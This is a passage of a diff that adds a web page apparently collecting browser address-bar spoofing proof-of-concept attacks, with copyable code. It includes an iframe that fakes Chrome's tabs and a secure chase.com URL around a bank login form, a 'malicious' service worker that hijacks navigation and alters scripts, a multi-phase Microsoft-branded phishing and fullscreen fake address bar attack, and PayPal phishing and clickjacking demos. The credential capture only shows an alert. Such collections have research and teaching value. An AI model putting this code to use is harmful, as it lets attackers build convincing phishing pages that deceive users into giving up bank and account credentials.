+                        <div class="poc-id">POC-2023-001</div>
+                        <span class="severity-badge severity-medium">Medium</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-edge">Edge</span>
+                    </div>
+                    
+                    <h3>iframe Sandbox Bypass with Fake Chrome UI</h3>
+                    <div class="poc-description">
+                        Create convincing fake browser UI inside iframe sandbox.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">HTML + CSS + JavaScript</span>
+                            <button class="copy-btn" onclick="copyCode('poc7')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc7">// Advanced iframe Chrome UI Spoofing
+function createAdvancedIframeSpoof() {
+    const iframe = document.createElement('iframe');
+    
+    // Sandbox with maximum permissions
+    iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-modals allow-popups';
+    
+    // Style to look like browser window
+    iframe.style.cssText = `
+        position: fixed;
+        top: 50px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 800px;
+        height: 600px;
+        border: 3px solid #3b82f6;
+        border-radius: 12px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+        z-index: 9999;
+        background: white;
+        resize: both;
+        overflow: hidden;
+        min-width: 400px;
+        min-height: 300px;
+    `;
+    
+    // Complex fake Chrome UI
+    iframe.srcdoc = `
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;Chase Online Banking - Google Chrome&lt;/title&gt;
+            &lt;meta charset="UTF-8"&gt;
+            &lt;style&gt;
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                }
+                
+                body {
+                    background: #f8f9fa;
+                    color: #202124;
+                }
+                
+                /* Fake Chrome UI */
+                .chrome-frame {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    background: #f1f3f4;
+                    border-bottom: 1px solid #dadce0;
+                    z-index: 1000;
+                }
+                
+                .chrome-tabs {
+                    display: flex;
+                    padding: 8px 8px 0 8px;
+                    gap: 8px;
+                }
+                
+                .chrome-tab {
+                    background: white;
+                    padding: 8px 16px;
+                    border-radius: 8px 8px 0 0;
+                    border: 1px solid #dadce0;
+                    border-bottom: none;
+                    font-size: 13px;
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    max-width: 200px;
+                }
+                
+                .chrome-tab.active {
+                    background: #f8f9fa;
+                }
+                
+                .favicon {
+                    width: 16px;
+                    height: 16px;
+                    background: #1a73e8;
+                    border-radius: 4px;
+                }
+                
+                .chrome-url-bar {
+                    padding: 12px;
+                    display: flex;
+                    align-items: center;
+                    gap: 12px;
+                }
+                
+                .url-display {
+                    flex: 1;
+                    background: white;
+                    padding: 10px 16px;
+                    border-radius: 24px;
+                    border: 1px solid #dadce0;
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                    font-size: 14px;
+                }
+                
+                .secure-icon {
+                    color: #1e8e3e;
+                    font-weight: bold;
+                }
+                
+                .url-text {
+                    font-family: 'SF Mono', 'Cascadia Code', monospace;
+                    color: #1a73e8;
+                }
+                
+                /* Banking Content */
+                .content {
+                    margin-top: 80px;
+                    padding: 40px;
+                    text-align: center;
+                }
+                
+                .bank-logo {
+                    color: #117aca;
+                    font-size: 48px;
+                    font-weight: bold;
+                    margin-bottom: 20px;
+                }
+                
+                .login-form {
+                    max-width: 400px;
+                    margin: 30px auto;
+                    padding: 30px;
+                    border: 1px solid #dadce0;
+                    border-radius: 8px;
+                    background: white;
+                }
+                
+                input {
+                    width: 100%;
+                    padding: 14px;
+                    margin: 10px 0;
+                    border: 1px solid #dadce0;
+                    border-radius: 4px;
+                    font-size: 16px;
+                }
+                
+                .login-btn {
+                    width: 100%;
+                    padding: 14px;
+                    background: #117aca;
+                    color: white;
+                    border: none;
+                    border-radius: 4px;
+                    font-size: 16px;
+                    font-weight: 500;
+                    cursor: pointer;
+                    margin-top: 10px;
+                }
+                
+                .security-alert {
+                    margin-top: 20px;
+                    padding: 20px;
+                    background: #fff3cd;
+                    border: 1px solid #ffeaa7;
+                    border-radius: 4px;
+                    color: #856404;
+                }
+                
+                .demo-notice {
+                    margin-top: 30px;
+                    padding: 15px;
+                    background: #d4edda;
+                    border: 1px solid #c3e6cb;
+                    border-radius: 4px;
+                    color: #155724;
+                    font-size: 14px;
+                }
+            &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;!-- Fake Chrome UI --&gt;
+            &lt;div class="chrome-frame"&gt;
+                &lt;div class="chrome-tabs"&gt;
+                    &lt;div class="chrome-tab active"&gt;
+                        &lt;div class="favicon"&gt;&lt;/div&gt;
+                        &lt;span&gt;Chase Online Banking&lt;/span&gt;
+                    &lt;/div&gt;
+                    &lt;div class="chrome-tab"&gt;
+                        &lt;div class="favicon" style="background: #ea4335;"&gt;&lt;/div&gt;
+                        &lt;span&gt;Gmail&lt;/span&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                
+                &lt;div class="chrome-url-bar"&gt;
+                    &lt;div class="url-display"&gt;
+                        &lt;span class="secure-icon"&gt;🔒&lt;/span&gt;
+                        &lt;span class="url-text"&gt;https://secure.chase.com&lt;/span&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            
+            &lt;!-- Banking Content --&gt;
+            &lt;div class="content"&gt;
+                &lt;div class="bank-logo"&gt;Chase&lt;/div&gt;
+                &lt;h2&gt;Sign in to Online Banking&lt;/h2&gt;
+                
+                &lt;div class="login-form"&gt;
+                    &lt;input type="text" placeholder="User ID" id="userId"&gt;
+                    &lt;input type="password" placeholder="Password" id="password"&gt;
+                    &lt;button class="login-btn" onclick="handleLogin()"&gt;Sign In&lt;/button&gt;
+                &lt;/div&gt;
+                
+                &lt;div class="security-alert"&gt;
+                    &lt;strong&gt;⚠ Security Notice&lt;/strong&gt;
+                    &lt;p&gt;We've detected unusual activity. Please verify your identity.&lt;/p&gt;
+                &lt;/div&gt;
+                
+                &lt;div class="demo-notice"&gt;
+                    &lt;strong&gt;🔒 SECURITY DEMONSTRATION&lt;/strong&gt;
+                    &lt;p&gt;This is a fake banking page inside an iframe.&lt;/p&gt;
+                    &lt;p&gt;The "Chrome UI" above is entirely HTML/CSS.&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            
+            &lt;script&gt;
+                function handleLogin() {
+                    const userId = document.getElementById('userId').value;
+                    const password = document.getElementById('password').value;
+                    
+                    if (userId && password) {
+                        alert('DEMO: Would steal credentials:\\nUser ID: ' + userId + '\\nPassword: ' + password);
+                        
+                        // Exfiltration simulation
+                        console.log('Credentials:', {userId, password});
+                        
+                        // Redirect after 2 seconds
+                        setTimeout(() => {
+                            window.location.href = 'about:blank';
+                        }, 2000);
+                    }
+                }
+                
+                // Auto-focus and show alerts
+                document.getElementById('userId').focus();
+                
+                setTimeout(() => {
+                    alert('🔐 Chase Security: Enhanced verification required');
+                }, 1000);
+                
+                setTimeout(() => {
+                    const notice = document.querySelector('.demo-notice');
+                    notice.innerHTML += '&lt;p style="margin-top:10px;"&gt;&lt;strong&gt;Real URL:&lt;/strong&gt; ' + window.location.href + '&lt;/p&gt;';
+                }, 3000);
+            &lt;\/script&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+    `;
+    
+    document.body.appendChild(iframe);
+    
+    // Add close button
+    const closeBtn = document.createElement('button');
+    closeBtn.textContent = 'Close Fake Browser';
+    closeBtn.style.cssText = `
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        z-index: 10000;
+        padding: 10px 20px;
+        background: #dc2626;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    `;
+    closeBtn.onclick = () => {
+        document.body.removeChild(iframe);
+        document.body.removeChild(closeBtn);
+    };
+    
+    document.body.appendChild(closeBtn);
+    
+    return iframe;
+}
+
+// Usage: createAdvancedIframeSpoof();</pre>
+                    </div>
+                    
+                    <button class="test-btn" onclick="runPOC('poc7')">
+                        <i class="fas fa-desktop"></i> Test Advanced iframe
+                    </button>
+                </div>
+                
+                <!-- POC 8: Service Worker Cache Poisoning -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2024-001</div>
+                        <span class="severity-badge severity-high">High</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-edge">Edge</span>
+                    </div>
+                    
+                    <h3>Service Worker Cache Poisoning Attack</h3>
+                    <div class="poc-description">
+                        Use Service Worker to intercept and modify requests, spoofing content.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript (Service Worker)</span>
+                            <button class="copy-btn" onclick="copyCode('poc8')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc8">// Service Worker Cache Poisoning POC
+async function installMaliciousServiceWorker() {
+    if (!('serviceWorker' in navigator)) {
+        console.log('Service Workers not supported');
+        return;
+    }
+    
+    try {
+        // Register malicious service worker
+        const registration = await navigator.serviceWorker.register(
+            `data:application/javascript;base64,${btoa(`
+                self.addEventListener('install', event => {
+                    console.log('[Malicious SW] Installing...');
+                    event.waitUntil(self.skipWaiting());
+                });
+                
+                self.addEventListener('activate', event => {
+                    console.log('[Malicious SW] Activating...');
+                    event.waitUntil(self.clients.claim());
+                });
+                
+                self.addEventListener('fetch', event => {
+                    const url = new URL(event.request.url);
+                    
+                    // Intercept specific requests
+                    if (url.hostname.includes('google-analytics.com') || 
+                        url.hostname.includes('googletagmanager.com')) {
+                        console.log('[Malicious SW] Blocking analytics:', url.href);
+                        event.respondWith(new Response('// Blocked by malicious SW', {
+                            headers: { 'Content-Type': 'application/javascript' }
+                        }));
+                        return;
+                    }
+                    
+                    // Spoof specific pages
+                    if (event.request.mode === 'navigate' && 
+                        event.request.headers.get('Accept')?.includes('text/html')) {
+                        
+                        console.log('[Malicious SW] Intercepting navigation to:', url.href);
+                        
+                        // Return spoofed page
+                        event.respondWith(new Response(\`
+                            &lt;!DOCTYPE html&gt;
+                            &lt;html&gt;
+                            &lt;head&gt;
+                                &lt;title&gt;Spoofed Page&lt;/title&gt;
+                                &lt;style&gt;
+                                    body { font-family: Arial; padding: 40px; text-align: center; }
+                                    .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; margin: 20px; }
+                                &lt;/style&gt;
+                            &lt;/head&gt;
+                            &lt;body&gt;
+                                &lt;h1&gt;⚠ THIS PAGE HAS BEEN SPOOFED&lt;/h1&gt;
+                                &lt;div class="warning"&gt;
+                                    &lt;strong&gt;Service Worker Cache Poisoning Demo&lt;/strong&gt;
+                                    &lt;p&gt;You requested: \${url.href}&lt;/p&gt;
+                                    &lt;p&gt;But got this fake page instead!&lt;/p&gt;
+                                &lt;/div&gt;
+                                &lt;p&gt;Service Worker intercepted and modified the response.&lt;/p&gt;
+                                &lt;button onclick="alert('Would execute malicious action')"&gt;
+                                    Click me (danger)
+                                &lt;/button&gt;
+                            &lt;/body&gt;
+                            &lt;/html&gt;
+                        \`, {
+                            headers: { 'Content-Type': 'text/html' }
+                        }));
+                        return;
+                    }
+                    
+                    // Cache poisoning for static resources
+                    if (url.pathname.endsWith('.js') || url.pathname.endsWith('.css')) {
+                        event.respondWith(
+                            fetch(event.request).then(response => {
+                                if (response.ok) {
+                                    return response.text().then(content => {
+                                        // Inject malicious code
+                                        const poisoned = content + '\\n// Injected by malicious Service Worker';
+                                        return new Response(poisoned, response);
+                                    });
+                                }
+                                return response;
+                            }).catch(() => response)
+                        );
+                    }
+                });
+                
+                // Background sync for persistence
+                self.addEventListener('sync', event => {
+                    if (event.tag === 'malicious-sync') {
+                        console.log('[Malicious SW] Background sync triggered');
+                        // Could exfiltrate data here
+                    }
+                });
+            `)}`,
+            { scope: './' }
+        );
+        
+        console.log('Malicious Service Worker registered:', registration);
+        return registration;
+        
+    } catch (error) {
+        console.error('Service Worker registration failed:', error);
+    }
+}
+
+// Test the Service Worker
+async function testServiceWorkerAttack() {
+    const sw = await installMaliciousServiceWorker();
+    
+    if (sw) {
+        // Test navigation interception
+        setTimeout(() => {
+            const testPage = window.open('./test-page.html', '_blank');
+            if (testPage) {
+                console.log('Test page opened - should be intercepted by SW');
+            }
+        }, 1000);
+    }
+}
+
+// Usage: testServiceWorkerAttack();</pre>
+                    </div>
+                    
+                    <button class="test-btn warning" onclick="runPOC('poc8')">
+                        <i class="fas fa-bolt"></i> Test Service Worker
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Special: Combined Advanced Attack -->
+        <div class="era-section">
+            <div class="era-title">
+                <div class="era-year">💥</div>
+                <div style="font-size: 18px; color: #94a3b8;">
+                    Combined Advanced Attack (2024)
+                </div>
+            </div>
+            
+            <div class="poc-grid">
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-ADV-2024</div>
+                        <span class="severity-badge severity-critical">Critical</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-edge">Edge</span>
+                    </div>
+                    
+                    <h3>Multi-Vector Advanced Spoofing Attack</h3>
+                    <div class="poc-description">
+                        Combined attack using multiple techniques for maximum impact.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript</span>
+                            <button class="copy-btn" onclick="copyCode('poc9')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc9">// Advanced Multi-Vector Address Bar Spoofing Attack
+async function executeAdvancedAttack() {
+    console.log('[Advanced Attack] Starting multi-vector attack...');
+    
+    // Phase 1: Blob URL phishing
+    const phase1 = () => {
+        const phishingPage = \`
+            &lt;!DOCTYPE html&gt;
+            &lt;html&gt;
+            &lt;head&gt;
+                &lt;title&gt;Microsoft Account Security&lt;/title&gt;
+                &lt;style&gt;
+                    body { font-family: 'Segoe UI', system-ui; padding: 40px; text-align: center; }
+                    .microsoft-logo { color: #0078d4; font-size: 48px; margin-bottom: 20px; }
+                    .security-alert { background: #fff4ce; border: 2px solid #ffb900; padding: 20px; margin: 20px; }
+                &lt;/style&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+                &lt;div class="microsoft-logo"&gt;Microsoft&lt;/div&gt;
+                &lt;h1&gt;Account Security Verification&lt;/h1&gt;
+                &lt;div class="security-alert"&gt;
+                    &lt;strong&gt;⚠ URGENT: Security Alert&lt;/strong&gt;
+                    &lt;p&gt;We detected suspicious activity on your account&lt;/p&gt;
+                &lt;/div&gt;
+                &lt;button onclick="nextPhase()" style="padding:12px 24px;"&gt;
+                    Verify Identity
+                &lt;/button&gt;
+                &lt;script&gt;
+                    function nextPhase() {
+                        window.location.href = 'about:blank';
+                        setTimeout(() => {
+                            document.write('&lt;h1&gt;Redirecting...&lt;/h1&gt;');
+                        }, 500);
+                    }
+                &lt;\/script&gt;
+            &lt;/body&gt;
+            &lt;/html&gt;
+        \`;
+        
+        const blob = new Blob([phishingPage], { type: 'text/html' });
+        return window.open(URL.createObjectURL(blob), '_blank', 'width=500,height=400');
+    };
+    
+    // Phase 2: iframe injection
+    const phase2 = () => {
+        const iframe = document.createElement('iframe');
+        iframe.sandbox = 'allow-scripts allow-same-origin';
+        iframe.style.cssText = \`
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 300px;
+            height: 200px;
+            border: 2px solid #dc2626;
+            border-radius: 10px;
+            z-index: 9999;
+            background: white;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        \`;
+        
+        iframe.srcdoc = \`
+            &lt;h3 style="color: red;"&gt;⚠ Security Warning&lt;/h3&gt;
+            &lt;p&gt;Your connection is not secure&lt;/p&gt;
+            &lt;button onclick="parent.alert('Would install malware')"&gt;
+                Fix Now
+            &lt;/button&gt;
+        \`;
+        
+        document.body.appendChild(iframe);
+        return iframe;
+    };
+    
+    // Phase 3: Fullscreen spoofing
+    const phase3 = () => {
+        const fsDiv = document.createElement('div');
+        fsDiv.id = 'fullscreenSpoof';
+        fsDiv.style.cssText = \`
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            z-index: 99999;
+            display: none;
+            padding-top: 60px;
+        \`;
+        
+        fsDiv.innerHTML = \`
+            &lt;div style="background:#f1f3f4;padding:10px;position:fixed;top:0;left:0;right:0;"&gt;
+                &lt;div style="background:white;padding:8px 16px;border-radius:20px;display:inline-block;"&gt;
+                    🔒 https://secure-banking.com
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div style="padding:40px;text-align:center;"&gt;
+                &lt;h1&gt;Fullscreen Spoofing Active&lt;/h1&gt;
+                &lt;p&gt;Browser UI is hidden, fake address bar shown&lt;/p&gt;
+                &lt;button onclick="document.exitFullscreen()"&gt;
+                    Exit Fullscreen
+                &lt;/button&gt;
+            &lt;/div&gt;
+        \`;
+        
+        document.body.appendChild(fsDiv);
+        
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().then(() => {
+                fsDiv.style.display = 'block';
+            });
+        }
+        
+        return fsDiv;
+    };
+    
+    // Execute phases with delays
+    console.log('[Phase 1] Launching blob phishing...');
+    const win1 = phase1();
+    
+    setTimeout(() => {
+        console.log('[Phase 2] Injecting iframe...');
+        const iframe = phase2();
+        
+        setTimeout(() => {
+            console.log('[Phase 3] Starting fullscreen spoof...');
+            const fs = phase3();
+            
+            // Cleanup after 10 seconds
+            setTimeout(() => {
+                console.log('[Cleanup] Ending attack...');
+                if (win1 && !win1.closed) win1.close();
+                if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe);
+                if (fs && fs.parentNode) fs.parentNode.removeChild(fs);
+                if (document.fullscreenElement) document.exitFullscreen();
+                
+                console.log('[Attack Complete] All phases executed');
+            }, 10000);
+            
+        }, 3000);
+    }, 2000);
+    
+    return true;
+}
+
+// Usage: executeAdvancedAttack();</pre>
+                    </div>
+                    
+                    <button class="test-btn danger" onclick="runPOC('poc9')">
+                        <i class="fas fa-bomb"></i> Execute Advanced Attack
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Results Panel -->
+    <div class="result-panel" id="resultPanel">
+        <div class="result-header">
+            <h4><i class="fas fa-clipboard-check"></i> POC Test Results</h4>
+            <button class="copy-btn" onclick="clearResults()">Clear</button>
+        </div>
+        <div id="resultList"></div>
+    </div>
+    
+    <!-- Demo Window -->
+    <div class="demo-window" id="demoWindow">
+        <div class="demo-header">
+            <div style="color: green;">🔒</div>
+            <div class="demo-url" id="demoUrl">https://secure-site.com</div>
+            <button class="close-btn" onclick="closeDemo()">×</button>
+        </div>
+        <div class="demo-content" id="demoContent">
+            <h1>Demo Window</h1>
+            <p>POC demonstration will appear here</p>
+        </div>
+    </div>
+    
+    <script>
+        // Global variables
+        let testResults = [];
+        let activeWindows = [];
+        let activeIframes = [];
+        let demoInterval;
+        
+        // Logging function
+        function logResult(message, type = 'info', pocId = null) {
+            const timestamp = new Date().toLocaleTimeString();
+            const result = {
+                timestamp,
+                message,
+                type,
+                pocId
+            };
+            
+            testResults.push(result);
+            updateResultDisplay();
+            
+            // Console logging with colors
+            const colors = {
+                success: 'color: #059669;',
+                error: 'color: #dc2626;',
+                warning: 'color: #d97706;',
+                info: 'color: #3b82f6;'
+            };
+            
+            console.log(`%c[${type.toUpperCase()}] ${timestamp}: ${message}`, colors[type] || '');
+        }
+        
+        // Update results display
+        function updateResultDisplay() {
+            const resultList = document.getElementById('resultList');
+            resultList.innerHTML = '';
+            
+            // Show last 15 results
+            const displayResults = testResults.slice(-15).reverse();
+            
+            displayResults.forEach(result => {
+                const item = document.createElement('div');
+                item.className = `result-item ${result.type}`;
+                item.innerHTML = `
+                    <div style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">
+                        ${result.timestamp} ${result.pocId ? `| ${result.pocId}` : ''}
+                    </div>
+                    <div style="font-size: 13px;">
+                        <span class="status-indicator status-${result.type}"></span>
+                        ${result.message}
+                    </div>
+                `;
+                resultList.appendChild(item);
+            });
+        }
+        
+        // Toggle results panel
+        function toggleResults() {
+            const panel = document.getElementById('resultPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'block';
+        }
+        
+        // Clear all results
+        function clearResults() {
+            testResults = [];
+            updateResultDisplay();
+            logResult('Results cleared', 'info');
+        }
+        
+        // Clear everything
+        function clearAll() {
+            clearResults();
+            
+            // Close all windows
+            activeWindows.forEach(win => {
+                try {
+                    if (win && !win.closed) win.close();
+                } catch(e) {}
+            });
+            activeWindows = [];
+            
+            // Remove all iframes
+            activeIframes.forEach(iframe => {
+                if (iframe && iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            });
+            activeIframes = [];
+            
+            // Exit fullscreen
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+            }
+            
+            logResult('All tests and windows cleared', 'success');
+        }
+        
+        // Copy code to clipboard
+        function copyCode(elementId) {
+            const codeElement = document.getElementById(elementId);
+            const codeText = codeElement.textContent;
+            
+            navigator.clipboard.writeText(codeText).then(() => {
+                logResult(`Code copied to clipboard: ${elementId}`, 'success');
+            }).catch(err => {
+                logResult(`Failed to copy code: ${err}`, 'error');
+            });
+        }
+        
+        // Run POC
+        function runPOC(pocId) {
+            logResult(`Executing ${pocId}...`, 'info', pocId);
+            
+            try {
+                switch(pocId) {
+                    case 'poc1':
+                        // IE6 spoofing (simulated)
+                        const win = window.open('about:blank', '_blank');
+                        if (win) {
+                            activeWindows.push(win);
+                            setTimeout(() => {
+                                win.document.write(`
+                                    <h1>IE6 Spoofing Simulation</h1>
+                                    <p>URL shows: about:blank</p>
+                                    <p>Content is fake login page</p>
+                                    <button onclick="alert('Would install malware')">
+                                        Install Updates
+                                    </button>
+                                `);
+                                win.document.close();
+                                logResult('POC-2005-001: IE6 spoofing simulated', 'success', pocId);
+                            }, 1000);
+                        }
+                        break;
+                        
+                    case 'poc3':
+                        // Clickjacking demo
+                        document.body.innerHTML += `
+                            <style>
+                                #clickjackDemo {
+                                    position: relative;
+                                    margin: 20px;
+                                    padding: 20px;
+                                }
+                                #legitBtn {
+                                    padding: 20px;
+                                    background: #4CAF50;
+                                    color: white;
+                                    border: none;
+                                    border-radius: 5px;
+                                    font-size: 16px;
+                                }
+                                #maliciousOverlay {
+                                    position: absolute;
+                                    top: 0;
+                                    left: 0;
+                                    width: 100%;
+                                    height: 100%;
+                                    opacity: 0.01;
+                                    z-index: 999;
+                                }
+                            </style>
+                            <div id="clickjackDemo">
+                                <button id="legitBtn" onclick="alert('Safe action')">
+                                    Click to Win $1000
+                                </button>
+                                <div id="maliciousOverlay"></div>
+                            </div>
+                        `;
+                        
+                        document.getElementById('maliciousOverlay').onclick = () => {
+                            alert('MALICIOUS: Money stolen!');
+                        };
+                        
+                        logResult('POC-2010-001: Clickjacking demo created', 'success', pocId);
+                        break;
+                        
+                    case 'poc5':
+                        // Fullscreen spoof
+                        const fsDiv = document.createElement('div');
+                        fsDiv.id = 'fsSpoof';
+                        fsDiv.style.cssText = `
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100vw;
+                            height: 100vh;
+                            background: white;
+                            z-index: 99999;
+                            display: none;
+                            padding-top: 60px;
+                        `;
+                        fsDiv.innerHTML = `
+                            <div style="background:#f1f3f4;padding:10px;position:fixed;top:0;left:0;right:0;">
+                                <div style="background:white;padding:8px 16px;border-radius:20px;display:inline-block;">
+                                    🔒 https://secure-site.com
+                                </div>
+                                <button onclick="document.exitFullscreen()" style="float:right;margin:5px;">Exit</button>
+                            </div>
+                            <div style="padding:40px;text-align:center;">
+                                <h1>Fullscreen Address Bar Spoof</h1>
+                                <p>Browser UI hidden, fake URL shown</p>
+                                <button onclick="alert('Demo action')">Click me</button>
+                            </div>
+                        `;
+                        document.body.appendChild(fsDiv);
+                        
+                        if (document.documentElement.requestFullscreen) {
+                            document.documentElement.requestFullscreen()
+                                .then(() => {
+                                    fsDiv.style.display = 'block';
+                                    logResult('POC-2018-001: Fullscreen spoof active', 'success', pocId);
+                                })
+                                .catch(e => {
+                                    logResult(`Fullscreen failed: ${e.message}`, 'error', pocId);
+                                });
+                        }
+                        break;
+                        
+                    case 'poc6':
+                        // Blob phishing
+                        const phishingHTML = `
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>PayPal Login</title>
+                                <style>
+                                    body { font-family: Arial; padding: 40px; text-align: center; }
+                                    .logo { color: #003087; font-size: 32px; font-weight: bold; }
+                                    .warning { background: #fff3cd; padding: 20px; margin: 20px; }
+                                </style>
+                            </head>
+                            <body>
+                                <div class="logo">PayPal</div>
+                                <h2>Security Verification</h2>
+                                <div class="warning">
+                                    <strong>⚠ Urgent Security Alert</strong>
+                                    <p>Verify your account to continue</p>
+                                </div>
+                                <button onclick="alert('Would steal credentials')">
+                                    Verify Now
+                                </button>
+                                <p style="margin-top:20px;color:#666;font-size:12px;">
+                                    Blob URL: ${window.location.origin}/...
+                                </p>
+                            </body>
+                            </html>
+                        `;
+                        
+                        const blob = new Blob([phishingHTML], { type: 'text/html' });
+                        const blobUrl = URL.createObjectURL(blob);
+                        const phishingWin = window.open(blobUrl, '_blank', 'width=400,height=500');
+                        activeWindows.push(phishingWin);
+                        
+                        logResult('POC-2019-001: Blob phishing launched', 'success', pocId);
+                        break;
+                        
+                    case 'poc7':
+                        // Advanced iframe
+                        const iframe = document.createElement('iframe');
+                        iframe.sandbox = 'allow-scripts allow-same-origin';
+                        iframe.style.cssText = `
+                            position: fixed;
+                            top: 100px;
+                            left: 50%;
+                            transform: translateX(-50%);
+                            width: 600px;
+                            height: 400px;
+                            border: 3px solid #3b82f6;
+                            border-radius: 10px;
+                            z-index: 9999;
+                            background: white;
+                        `;
+                        iframe.srcdoc = `
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>Fake Chrome</title>
+                                <style>
+                                    body { margin: 0; font-family: Arial; }
+                                    .fake-bar { background: #f1f3f4; padding: 10px; }
+                                    .fake-url { background: white; padding: 8px; border-radius: 20px; }
+                                </style>
+                            </head>
+                            <body>
+                                <div class="fake-bar">
+                                    <div class="fake-url">🔒 https://accounts.google.com</div>
+                                </div>
+                                <div style="padding:40px;text-align:center;">
+                                    <h1>Fake Chrome UI</h1>
+                                    <p>iframe with spoofed address bar</p>
+                                </div>
+                            </body>
+                            </html>
+                        `;
+                        document.body.appendChild(iframe);
+                        activeIframes.push(iframe);
+                        
+                        logResult('POC-2023-001: Advanced iframe created', 'success', pocId);
+                        break;
+                        
+                    case 'poc9':
+                        // Advanced attack
+                        executeAdvancedAttack();
+                        logResult('Advanced attack launched', 'warning', pocId);
+                        break;
+                        
+                    default:
+                        logResult(`POC ${pocId} not implemented in demo`, 'warning', pocId);
+                }
+                
+            } catch (error) {
+                logResult(`Error running ${pocId}: ${error.message}`, 'error', pocId);
+            }
+        }
+        
+        // Advanced attack function
+        function executeAdvancedAttack() {
+            logResult('Starting advanced multi-vector attack...', 'warning');
+            
+            // Phase 1: Blob
+            const blobHTML = `<h1>Phase 1: Blob Phishing</h1><p>Multi-stage attack demo</p>`;
+            const blob = new Blob([blobHTML], { type: 'text/html' });
+            const win1 = window.open(URL.createObjectURL(blob), '_blank');
+            activeWindows.push(win1);
+            
+            // Phase 2: iframe
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    width: 300px;
+                    height: 150px;
+                    border: 2px solid red;
+                    z-index: 9999;
+                `;
+                iframe.srcdoc = `<h3 style="color:red;">⚠ Warning</h3><p>Security alert!</p>`;
+                document.body.appendChild(iframe);
+                activeIframes.push(iframe);
+                
+                logResult('Phase 2: iframe injected', 'warning');
+            }, 2000);
+            
+            // Phase 3: Alert
+            setTimeout(() => {
+                alert('Advanced attack demonstration complete');
+                logResult('Attack completed', 'success');
+            }, 4000);
+        }
+        
+        // Show demo window
+        function showDemo(url, content) {
+            const demoWindow = document.getElementById('demoWindow');
+            const demoUrl = document.getElementById('demoUrl');
+            const demoContent = document.getElementById('demoContent');
+            
+            demoUrl.textContent = url;
+            demoContent.innerHTML = content;
+            demoWindow.style.display = 'block';
+            
+            clearTimeout(demoInterval);
+            demoInterval = setTimeout(closeDemo, 10000);
+        }
+        
+        function closeDemo() {
+            document.getElementById('demoWindow').style.display = 'none';
+        }
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            logResult('POC Collection loaded successfully', 'success');
+            logResult(`Browser: ${navigator.userAgent}`, 'info');
+            
+            // Auto-show results panel
+            setTimeout(toggleResults, 1000);
+        });
+        
+        // Cleanup on exit
+        window.addEventListener('beforeunload', clearAll);
+    </script>
+</body>
+</html>
